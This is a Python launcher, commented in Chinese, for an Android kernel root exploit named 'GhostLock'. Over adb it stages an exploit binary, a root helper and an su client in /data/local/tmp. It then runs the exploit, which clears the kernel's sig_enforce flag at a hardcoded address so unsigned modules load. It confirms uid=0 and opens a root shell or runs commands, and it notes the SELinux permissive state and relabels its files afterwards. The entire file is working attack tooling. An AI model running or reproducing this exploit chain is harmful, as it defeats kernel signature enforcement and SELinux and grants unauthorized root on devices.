#!/usr/bin/env python3
"""GhostLock 临时 root：一条命令完成推送、利用、转发、验证。

用法:
    python glk_root.py                 # 拿 root，打印状态后退出（helper 常驻）
    python glk_root.py --shell         # 拿 root 后直接进交互 shell
    python glk_root.py --exec "id; getenforce"
    python glk_root.py --connect-only  # root 已在，只连一下验证

窗口提醒: 这颗内核上 root 只能维持数分钟，之后内核 panic 重启，需要重跑本脚本。
"""
from __future__ import annotations

import argparse
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path

TOOLS = Path(__file__).resolve().parent
WORK = TOOLS.parent
REPO = WORK.parent
BIN = REPO / "ghostlock" / "build" / "native" / "ghostlock"
HELPER = TOOLS / "glk_helper"
SU = TOOLS / "su"
PERM = TOOLS / "su-perm"
PROFILE = WORK / "profile_175.bin"
# image 基址 0xffffffc080000000 + sig_enforce 相对 _text 偏移 0x30c7708。
# 每次重启后 sig_enforce 都复位成 Y，必须先用 W1c 写 0，否则 LKM 验签被拒。
DEFAULT_ZERO_ADDR = "0xffffffc0830c7708"

DEV_BIN = "/data/local/tmp/glk-bin"
DEV_BINS = [
    "/data/local/tmp/glk-bin",
    "/data/local/tmp/glk-bin2",
    "/data/local/tmp/glk-bin3",
]
# 与 victim_process.cpp 里的候选顺序保持一致
DEV_HELPERS = [
    "/data/local/tmp/glk-helper-bin",
    "/data/local/tmp/glk-helper-b",
    "/data/local/tmp/glk-helper-c",
]
DEV_PROFILE = "/data/local/tmp/profile_175.bin"
# 客户端 su：连 helper 的 unix socket（/data/local/tmp/.glk/su.sock），
# 由 helper 用 SO_PEERCRED 做 uid 白名单，不再开放无鉴权的 2323 端口。
DEV_SU = "/data/local/tmp/su"
DEV_PERM = "/data/local/tmp/su-perm"

ADB = shutil.which("adb") or "adb"


def run(args: list[str], timeout: int = 120) -> subprocess.CompletedProcess:
    return subprocess.run(args, capture_output=True, text=True, timeout=timeout)


def devices() -> list[str]:
    out = run([ADB, "devices"]).stdout.splitlines()[1:]
    return [line.split()[0] for line in out if line.strip().endswith("device")]


def sh(cmd: str, timeout: int = 60) -> str:
    return run([ADB, "shell", cmd], timeout=timeout).stdout.strip()


def shell_ok(path: str) -> bool:
    return run([ADB, "shell", f"test -x {path}"]).returncode == 0


def push(local: Path, remote: str) -> bool:
    res = run([ADB, "push", str(local), remote], timeout=180)
    err = (res.stderr or "") + (res.stdout or "")
    if res.returncode != 0:
        print(f"[!] 推送 {remote} 失败: {err.strip().splitlines()[-1] if err.strip() else 'unknown'}")
        return False
    run([ADB, "shell", f"chmod 755 {remote}"])
    return True


def local_md5(path: Path) -> str:
    import hashlib

    return hashlib.md5(path.read_bytes()).hexdigest()


def dev_md5(remote: str) -> str:
    out = sh(f"md5sum {remote} 2>/dev/null")
    return out.split()[0] if out.strip() else ""


def ensure(local: Path, candidates: list[str], need_exec: bool) -> str | None:
    """让 local 在设备上落到某个候选路径，返回实际可用路径。

    内核 panic 之后，permissive 期间新建的文件会丢掉 SELinux 标签，之后
    shell 域连 stat/rm/push 都会被拒；所以这里按哈希确认、失败就换下一个名字。
    """
    want = local_md5(local)
    for remote in candidates:
        if dev_md5(remote) == want and (not need_exec or shell_ok(remote)):
            run([ADB, "shell", f"chmod 755 {remote}"])
            return remote
    for remote in candidates:
        if push(local, remote) and dev_md5(remote) == want:
            return remote
    return None


def stage() -> tuple[str, str] | None:
    """确保四段载荷就位，返回 (exploit_path, helper_path)。"""
    for f in (BIN, HELPER, SU, PERM, PROFILE):
        if not f.is_file():
            print(f"[!] 缺少本地文件: {f}")
            return None

    exploit = ensure(BIN, DEV_BINS, need_exec=True)
    if not exploit:
        print("[!] exploit 放不上去（旧 inode 标签坏了）。重启设备后再试，或先以 root 删掉旧文件")
        return None

    helper = ensure(HELPER, DEV_HELPERS, need_exec=True)
    if not helper:
        print("[!] helper 三个候选路径都推不上去，重启设备后再试")
        return None

    if not ensure(SU, [DEV_SU], need_exec=True):
        print("[!] su 客户端推不上去")
        return None

    if not ensure(PERM, [DEV_PERM], need_exec=True):
        print("[!] su-perm 权限管理脚本推不上去")
        return None

    if not ensure(PROFILE, [DEV_PROFILE], need_exec=False):
        print("[!] profile 无法推送")
        return None
    return exploit, helper


def root_exec(cmd: str, timeout: int = 25) -> str:
    """通过设备上的 su 客户端执行 root 命令（走 helper 的 unix socket）。"""
    quoted = "'" + cmd.replace("'", "'\\''") + "'"
    res = run([ADB, "exec-out", f"{DEV_SU} -c {quoted}"], timeout=timeout)
    return ((res.stdout or "") + (res.stderr or "")).strip()


def wait_for_helper(limit: int = 70) -> bool:
    deadline = time.time() + limit
    while time.time() < deadline:
        if sh("ps -A -o NAME 2>/dev/null | grep -qx glk_helper && echo HIT").endswith("HIT"):
            return True
        if not devices():
            print("[!] 设备离线（内核可能 panic 了），等它重启后重跑")
            return False
        time.sleep(2)
    return False


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--shell", action="store_true", help="拿到 root 后进入交互 shell")
    ap.add_argument("--exec", dest="exec_cmd", help="拿到 root 后执行一条命令")
    ap.add_argument("--connect-only", action="store_true", help="不跑 exploit，只连现有 helper")
    ap.add_argument("--zero-addr", default=DEFAULT_ZERO_ADDR,
                    help="W1c 额外清零的镜像地址（默认清 sig_enforce，传 none 关闭）")
    args = ap.parse_args()

    if not devices():
        print("[!] 没有设备。确认 USB 已连、USB 调试已开（adb devices 应能看到设备）")
        return 1

    if not args.connect_only:
        staged = stage()
        if not staged:
            return 1
        exploit, helper = staged
        print(f"[*] 载荷: {exploit} + {helper}")
        print("[*] 运行 exploit（约 15 秒，有 panic 风险）...")
        started = time.time()
        dev_log = "/data/local/tmp/glk-run.log"
        zero_env = ""
        if args.zero_addr and args.zero_addr.lower() != "none":
            zero_env = f"GLK_ZERO_ADDR={args.zero_addr} "
            print(f"[*] W1c 清零: {args.zero_addr} (sig_enforce)")
        # 必须 detach：helper 会继承 adb shell 的会话，前台跑会让 adb 永远不返回
        run([ADB, "shell",
             f"setsid sh -c '{zero_env}{exploit} --load-prebuilt-profile {DEV_PROFILE}"
             f" > {dev_log} 2>&1' < /dev/null > /dev/null 2>&1 &"], timeout=40)
        log = ""
        for _ in range(45):
            time.sleep(2)
            log = sh(f"cat {dev_log} 2>/dev/null")
            if "exploit complete" in log or "child is root" not in log and "W2" in log and "fail" in log:
                break
            if not devices():
                print("[!] 设备掉线了（内核 panic），等它重启后重跑本脚本")
                return 1
        for line in log.strip().splitlines()[-6:]:
            print("    " + line)
        if "child is root" not in log:
            print("[!] 没有出现 'child is root'，W1/W2 未成功，重跑一次通常能过")
            return 1
        if not wait_for_helper():
            print("[!] helper 没起来（handoff 失败），检查上方日志")
            return 1
        window = time.time() - started
        print(f"[+] helper 已起来，耗时 {window:.0f}s")

    head = root_exec("id; getenforce; cat /proc/self/attr/current")
    if not head:
        print("[!] su 无输出：helper 的 socket 没起来，或 su 没推上去")
        return 1
    for line in [ln for ln in head.strip().splitlines() if ln.strip()]:
        print("    " + line.strip())
    if "uid=0" not in head:
        print("[!] 拿到的不是 uid=0")
        return 1

    print("[!] 窗口有限：这颗内核上 root 通常只能维持 1~6 分钟，之后 panic 重启")
    print("    临时文件建议放 /data/local/tmp，重要写入别跨重启")
    print(f"    之后用: adb shell {DEV_SU} -c \"id\"   （或 adb shell -t {DEV_SU} 进 root shell）")

    # 在 permissive 状态下新建的文件拿不到 SELinux 标签（ls -lZ 显示 ?），重启回到
    # enforcing 后 shell 域连 stat/rm 都会被拒。趁现在有 root 把标签补回去。
    root_exec("restorecon /data/local/tmp/glk-* /data/local/tmp/.ghostlock_root.sh "
              "2>/dev/null; echo done", timeout=15)

    if args.exec_cmd:
        print("[*] 执行:", args.exec_cmd)
        print(root_exec(args.exec_cmd, timeout=25))
        return 0

    if args.shell:
        return subprocess.call([ADB, "shell", "-t", DEV_SU])
    return 0


if __name__ == "__main__":
    sys.exit(main())
